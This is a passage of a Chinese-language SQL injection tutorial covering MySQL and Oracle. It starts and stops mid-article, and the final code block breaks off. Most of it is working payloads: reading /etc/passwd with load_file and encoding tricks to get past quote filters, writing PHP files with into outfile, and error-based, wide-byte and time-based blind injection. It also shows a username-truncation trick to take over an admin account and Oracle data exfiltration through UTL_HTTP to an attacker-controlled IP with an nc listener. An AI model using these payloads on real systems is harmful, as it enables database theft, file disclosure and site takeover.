<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>load_file<span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>如果一些防注入语句不允许单引号的出现，可以使用</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>load_file<span class="token punctuation">(</span><span class="token number">0x2f6574632f706173737764</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>来绕过<br>或者使用</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>load_file<span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">58</span><span class="token punctuation">,</span><span class="token number">92</span><span class="token punctuation">,</span><span class="token number">49</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">120</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>如果浏览器返回数据存在乱码，可以使用hex()将字符串转换为16进制数据</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">union</span> <span class="token keyword">select</span> hex<span class="token punctuation">(</span>load_file<span class="token punctuation">(</span><span class="token number">0x2732747448</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h5 id="into-outfile-写文件操作"><a href="#into-outfile-写文件操作" class="headerlink" title="into outfile #写文件操作"></a>into outfile #写文件操作</h5><p>注：用户必须持有FILE权限，并且文件必须为绝对路径<br>例：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token string">'&lt;?php phpinfo(); ?>'</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'c:\wwwroot\1.php'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>或</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">98</span><span class="token punctuation">,</span><span class="token number">58</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">,</span><span class="token number">67</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">96</span><span class="token punctuation">,</span><span class="token number">87</span><span class="token punctuation">,</span><span class="token number">66</span><span class="token punctuation">)</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'c:\wwwroot\1.php'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>或</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token number">0x283483483</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token number">0x238348438438</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h5 id="连接字符串："><a href="#连接字符串：" class="headerlink" title="连接字符串："></a>连接字符串：</h5><p>concat()<br>例：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> username <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> concat<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'#'</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'#'</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>concat_ws()<br>例：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> username <span class="token keyword">from</span> users <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> concat_ws<span class="token punctuation">(</span><span class="token string">'#'</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h5 id="常见mysql函数："><a href="#常见mysql函数：" class="headerlink" title="常见mysql函数："></a>常见mysql函数：</h5><p>length #返回字符串长度<br>substring #截取字符串长度<br>ascii #返回ascii码<br>hex #把字符串转换为16进制<br>now #当前系统时间<br>unhex #hex的反向操作<br>floor(x) #返回小于等于x的最大整数值<br>md5 #返回md5值<br>group_concat #返回带有来自一个组的连接的非null值的字符串结果<br>@@datadir #读取数据库路径<br>@@basedir #MYSQL安装路径<br>@@version_compile_os #操作系统<br>user #用户名<br>current_user #当前用户名<br>system_user #系统用户名<br>database #数据库名<br>version #MYSQL数据库版本<br>注：使用这些函数都需要有相应的权限</p>
<h5 id="mysql函数的权限："><a href="#mysql函数的权限：" class="headerlink" title="mysql函数的权限："></a>mysql函数的权限：</h5><table>
<thead>
<tr>
<th align="center">权限</th>
<th align="center">权限级别</th>
<th align="center">权限说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">create</td>
<td align="center">数据库、表或索引</td>
<td align="center">创建数据库、表或索引权限</td>
</tr>
<tr>
<td align="center">drop</td>
<td align="center">数据库或表</td>
<td align="center">删除数据库或表权限</td>
</tr>
<tr>
<td align="center">grant option</td>
<td align="center">数据库、表或保存的程序</td>
<td align="center">赋予权限选项</td>
</tr>
<tr>
<td align="center">alter</td>
<td align="center">表</td>
<td align="center">更改表，比如添加字段</td>
</tr>
<tr>
<td align="center">delete</td>
<td align="center">表</td>
<td align="center">删除数据权限</td>
</tr>
<tr>
<td align="center">index</td>
<td align="center">表</td>
<td align="center">索引权限</td>
</tr>
<tr>
<td align="center">insert</td>
<td align="center">表</td>
<td align="center">插入数据权限</td>
</tr>
<tr>
<td align="center">select</td>
<td align="center">表</td>
<td align="center">查询权限</td>
</tr>
<tr>
<td align="center">update</td>
<td align="center">表</td>
<td align="center">更新权限</td>
</tr>
<tr>
<td align="center">create view</td>
<td align="center">视图</td>
<td align="center">创建视图权限</td>
</tr>
<tr>
<td align="center">show view</td>
<td align="center">视图</td>
<td align="center">查看视图权限</td>
</tr>
<tr>
<td align="center">alter routine</td>
<td align="center">存储过程</td>
<td align="center">更改存储过程权限</td>
</tr>
<tr>
<td align="center">create routine</td>
<td align="center">存储过程</td>
<td align="center">创建存储过程权限</td>
</tr>
<tr>
<td align="center">execute</td>
<td align="center">存储过程</td>
<td align="center">执行存储过程权限</td>
</tr>
<tr>
<td align="center">file</td>
<td align="center">服务器主机上的文件访问</td>
<td align="center">文件访问权限</td>
</tr>
<tr>
<td align="center">create temporary tables</td>
<td align="center">服务器管理</td>
<td align="center">创建临时表权限</td>
</tr>
<tr>
<td align="center">lock tables</td>
<td align="center">服务器管理</td>
<td align="center">锁表权限</td>
</tr>
<tr>
<td align="center">create user</td>
<td align="center">服务器管理</td>
<td align="center">创建用户权限</td>
</tr>
<tr>
<td align="center">process</td>
<td align="center">服务器管理</td>
<td align="center">查看进程权限</td>
</tr>
<tr>
<td align="center">reload</td>
<td align="center">服务器管理</td>
<td align="center">执行flush-hosts、flush-logs、flush-privileges等命令权限</td>
</tr>
<tr>
<td align="center">replication client</td>
<td align="center">服务器管理</td>
<td align="center">复制权限</td>
</tr>
<tr>
<td align="center">replication slave</td>
<td align="center">服务器管理</td>
<td align="center">复制权限</td>
</tr>
<tr>
<td align="center">show databases</td>
<td align="center">服务器管理</td>
<td align="center">查看数据库权限</td>
</tr>
<tr>
<td align="center">shutdown</td>
<td align="center">服务器管理</td>
<td align="center">关闭数据库权限</td>
</tr>
<tr>
<td align="center">super</td>
<td align="center">服务器管理</td>
<td align="center">执行kill线程权限</td>
</tr>
</tbody></table>
<h4 id="5-MYSQL显错式注入"><a href="#5-MYSQL显错式注入" class="headerlink" title="5.MYSQL显错式注入"></a>5.MYSQL显错式注入</h4><h5 id="通过updatexml-函数报错"><a href="#通过updatexml-函数报错" class="headerlink" title="通过updatexml()函数报错:"></a>通过updatexml()函数报错:</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7c</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>注:updatexml()函数的第二个参数必须为xpath格式的字符串，由于0x7c是”|”,不是xpath格式，所以会报错说xpath语法错误 </p>
<h5 id="通过extractvalue-函数报错"><a href="#通过extractvalue-函数报错" class="headerlink" title="通过extractvalue()函数报错:"></a>通过extractvalue()函数报错:</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7c</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>注：extractvalue()第二个参数必须为xpath格式的字符串，由于0x7c是”|”,不是xpath格式，所以会报错说xpath语法错误 </p>
<h5 id="通过floor-函数报错"><a href="#通过floor-函数报错" class="headerlink" title="通过floor()函数报错:"></a>通过floor()函数报错:</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>concat<span class="token punctuation">(</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> a<span class="token punctuation">)</span>b<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="6-宽字节注入"><a href="#6-宽字节注入" class="headerlink" title="6.宽字节注入"></a>6.宽字节注入</h4><h5 id="前提条件："><a href="#前提条件：" class="headerlink" title="前提条件："></a>前提条件：</h5><p>一般出现在php+mysql中,数据库编码方式为宽字节编码,<br>当php配置文件php.ini中magic_quotes_gpc(魔术引导)选项被打开时,<br>使用get,post,cookie所接收的’(单引号)、”(双引号)、\(反斜线)和null 字符都会被自动加上一个反斜线转义</p>
<h5 id="根本原因："><a href="#根本原因：" class="headerlink" title="根本原因："></a>根本原因：</h5><p>编码不统一</p>
<h5 id="例："><a href="#例：" class="headerlink" title="例："></a>例：</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> username <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token string">'%d5'</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>由于魔术引导，所以该语句变为</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> username <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token string">'%d5\''</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>但是%d5\被浏览器url编码后为%d5%5c,由于数据库编码方式为宽字节编码，<br>它会把%d5%5c解码为一个汉字，因此就绕过了\对我们输入的单引号转义的限<br>制，因此可以构造sql语句：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> username <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token string">'%d5'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">-- '</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="7-mysql长字符截断"><a href="#7-mysql长字符截断" class="headerlink" title="7.mysql长字符截断"></a>7.mysql长字符截断</h4><h5 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件:"></a>前提条件:</h5><p>mysql中的一个设置里有一个sql_mode选项，当sql_mode设置为default时，<br>即没有开启strict_all_tables选项时（mysql sql_mode默认为default)，<br>MYSQL对插入超长的值只会提示warning,而不是error,这样就会导致一些截断问题</p>
<h5 id="例：-1"><a href="#例：-1" class="headerlink" title="例："></a>例：</h5><p>假设当前数据库有user表，表中有name这个列，<br>表中有一条admin的记录(用户名为“admin”,长度为5,是管理员密码），<br>name列的定义为varchar(7)，向user表中插入数据：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">insert</span> <span class="token keyword">into</span> <span class="token keyword">user</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'admin '</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>注：admin后为很多空格，admin和空格的总长度远远大于name列的规定长度7<br>这样，我们就向user表中添加了一个用户,查看该用户名长度，发现长度为7,<br>说明我们插入的用户名被截断了，只保留了name列规定的前7位<br>通过 </p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> name <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> name<span class="token operator">=</span><span class="token string">'admin'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>我们发现不仅查出了“admin”这个用户名，还查出来了”admin “这个用户名。</p>
<h5 id="利用方式："><a href="#利用方式：" class="headerlink" title="利用方式："></a>利用方式：</h5><p>假设没有sql注入漏洞可以利用，目标用户名为”admin”,<br>我们就可以利用mysql长字符截断的特性来注册一个”admin “之类的用户名（好像给admin用户增加了一个密码似的），<br>我们就可以用我们注册的帐号密码去登录，就可以进入admin用户的后台管理页面。</p>
<h4 id="8-延时注入-盲注）"><a href="#8-延时注入-盲注）" class="headerlink" title="8.延时注入(盲注）"></a>8.延时注入(盲注）</h4><h5 id="判断是否存在sql注入及注入点"><a href="#判断是否存在sql注入及注入点" class="headerlink" title="判断是否存在sql注入及注入点:"></a>判断是否存在sql注入及注入点:</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>注：如果3秒后返回页面，说明存在sql注入，即可判断出注入点 </p>
<h5 id="通过延时注入读取数据"><a href="#通过延时注入读取数据" class="headerlink" title="通过延时注入读取数据:"></a>通过延时注入读取数据:</h5><p>(1)首先判断当前查询的字符串的长度:  </p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span>length<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>(2)字符串长度判断出之后，截取查询字符串的第一个字符，并转换为ascii码，将该ascii码与ascii码表对比: </p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span><span class="token function">mid</span><span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>递归破解出字符串所有的字符<br>注：不仅在MYSQL中存在延时函数，在SQL server、Oracle等数据库中也都存在类似功能的函数，比如SQL server中的waitfor delay、Oracle中的dbms_lock.sleep等函数</p>
<h3 id="Oracle-（Oracle不支持多语句执行"><a href="#Oracle-（Oracle不支持多语句执行" class="headerlink" title="Oracle （Oracle不支持多语句执行)"></a>Oracle （Oracle不支持多语句执行)</h3><h4 id="1-获取元数据"><a href="#1-获取元数据" class="headerlink" title="1.获取元数据"></a>1.获取元数据</h4><h5 id="（1）user-tablespaces视图：查看表空间："><a href="#（1）user-tablespaces视图：查看表空间：" class="headerlink" title="（1）user_tablespaces视图：查看表空间："></a>（1）user_tablespaces视图：查看表空间：</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> tablespace_name <span class="token keyword">from</span> user_tablespaces<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h5 id="2-user-tables视图：查看当前用户的所有表"><a href="#2-user-tables视图：查看当前用户的所有表" class="headerlink" title="(2)user_tables视图：查看当前用户的所有表:"></a>(2)user_tables视图：查看当前用户的所有表:</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> table_name <span class="token keyword">from</span> user_tables <span class="token keyword">where</span> rownum<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h5 id="3-user-tab-columns视图-查看当前用户表的所有列"><a href="#3-user-tab-columns视图-查看当前用户表的所有列" class="headerlink" title="(3)user_tab_columns视图:查看当前用户表的所有列:"></a>(3)user_tab_columns视图:查看当前用户表的所有列:</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> column_name <span class="token keyword">from</span> user_tab_columns <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'users'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h5 id="4-all-users视图：查看Oracle数据库的所有用户"><a href="#4-all-users视图：查看Oracle数据库的所有用户" class="headerlink" title="(4)all_users视图：查看Oracle数据库的所有用户:"></a>(4)all_users视图：查看Oracle数据库的所有用户:</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> username <span class="token keyword">from</span> all_users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h5 id="5-user-objects视图：查看当前用户的所有对象-表名、约束、索引）"><a href="#5-user-objects视图：查看当前用户的所有对象-表名、约束、索引）" class="headerlink" title="(5)user_objects视图：查看当前用户的所有对象(表名、约束、索引）:"></a>(5)user_objects视图：查看当前用户的所有对象(表名、约束、索引）:</h5><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> object_name <span class="token keyword">from</span> user_objects<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="2-union查询"><a href="#2-union查询" class="headerlink" title="2.union查询"></a>2.union查询</h4><h5 id="第一步：获取列数："><a href="#第一步：获取列数：" class="headerlink" title="第一步：获取列数："></a>第一步：获取列数：</h5><ul>
<li><p>使用 order by 获取列数:</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>使用union获取列数:</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span> <span class="token keyword">from</span> dual<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>注：Oracle规定，每次查询时后面必须跟表名称，否则sql语句错误；<br>dual是Oracle的虚拟表，在不知道数据库中存在哪些表的情况下可以使用此表作为查询表；<br>Oracle是强类型的数据库，一般使用null</p>
</li>
</ul>
<h5 id="第二步：获取敏感信息："><a href="#第二步：获取敏感信息：" class="headerlink" title="第二步：获取敏感信息："></a>第二步：获取敏感信息：</h5><p>常见敏感信息:</p>
<ul>
<li><p>当前用户权限：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> session_roles<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>当前数据库版本:</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> banner <span class="token keyword">from</span> sys<span class="token punctuation">.</span>v_$version <span class="token keyword">where</span> rownum<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>服务器出口IP：<br>用utl_http.request可以实现</p>
</li>
<li><p>服务器监听IP：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> utl_inaddr<span class="token punctuation">.</span>get_host_address <span class="token keyword">from</span> dual<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>服务器操作系统:</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> member <span class="token keyword">from</span> v$logfile <span class="token keyword">where</span> rownum<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>服务器sid:</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> instance_name <span class="token keyword">from</span> v$instance<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>当前连接用户:</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> SYS_CONTEXT<span class="token punctuation">(</span><span class="token string">'USERENV'</span><span class="token punctuation">,</span><span class="token string">'CURRENT_USER'</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ul>
<p>获取数据库表及其内容：</p>
<ul>
<li>在得知表的列数之后，可以通过查询元数据的方式查询表名、列名，然后查询数据:<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> username<span class="token punctuation">,</span>password<span class="token punctuation">,</span><span class="token boolean">null</span> <span class="token keyword">from</span> users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
注：在查询数据时要注意数据类型，要一一测试，否则无法查询：<br><code>union select username,null,null from users</code><br><code>union select null,username,null from users</code><br><code>union select null,null,username from users</code><br>注：在得知列数之后，也可以通过暴力猜解的方式来枚举表名：<br><code>http://xss.com/a.php?id=1 union select null,null,null from tableName</code><br>同样也可以使用暴力猜解的方法枚举列名：<br><code>http://xss.com/a.php?id=1 union select columnName,null,null from tableName</code><br><code>http://xss.com/a.php?id=1 union select null,columnName,null from tableName</code><br><code>http://xss.com/a.php?id=1 union select null,null,columnName from tableName</code></li>
</ul>
<h4 id="3-Oracle中包的概念"><a href="#3-Oracle中包的概念" class="headerlink" title="3.Oracle中包的概念"></a>3.Oracle中包的概念</h4><h5 id="UTL-HTTP包：提供了对HTTP的一些操作"><a href="#UTL-HTTP包：提供了对HTTP的一些操作" class="headerlink" title="UTL_HTTP包：提供了对HTTP的一些操作"></a>UTL_HTTP包：提供了对HTTP的一些操作</h5><ul>
<li><p>例： </p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> UTL_HTTP<span class="token punctuation">.</span>REQUEST<span class="token punctuation">(</span><span class="token string">'http://www.baidu.com'</span><span class="token punctuation">)</span> <span class="token keyword">from</span> dual<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>很多时候页面不能直接回显，可以利用此包将数据反弹到一个外网IP查看:</p>
<ul>
<li>第一步：使用nc监听数据:  <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">nc <span class="token operator">-</span>l <span class="token operator">-</span>vv <span class="token operator">-</span>p <span class="token number">8888</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li>第二步：反弹数据信息:  <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> UTL_HTTP<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">'[http://IP:8888/'</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token keyword">SQL</span>语句<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>http:<span class="token comment">//IP:8888/%27%7C%7C%28SQL%E8%AF%AD%E5%8F%A5%29 "http://IP:8888/'%7C%7C(SQL%E8%AF%AD%E5%8F%A5)"))=1--</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
  注：前提是该服务器必须可以联网，且UTL_HTTP必须存在。</li>
</ul>
</li>
<li><p>判断UTL_HTTP是否存在：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> all_objects <span class="token keyword">where</span> object_name<span class="token operator">=</span><span class="token string">'UTL_HTTP'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ul>
<h5 id="UTL-FILE包-用来操作IO"><a href="#UTL-FILE包-用来操作IO" class="headerlink" title="UTL_FILE包:用来操作IO"></a>UTL_FILE包:用来操作IO</h5><ul>
<li><p>向磁盘写入文件：</p>
<ul>
<li>第一步：准备文件写入目录:  <pre class="line-numbers language-java" data-language="java"><code class="language-java">create or replace directory <span class="token constant">XXSER_DIR</span> as <span class="token char">'C:'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li>第二步：写入文件:  <pre class="line-numbers language-java" data-language="java"><code class="language-java">declare
xs_file utl_file<span class="token punctuation">.</span>file_type<span class="token punctuation">;</span> #定义变量的类型为utl_file<span class="token punctuation">.</span>file_type
begin
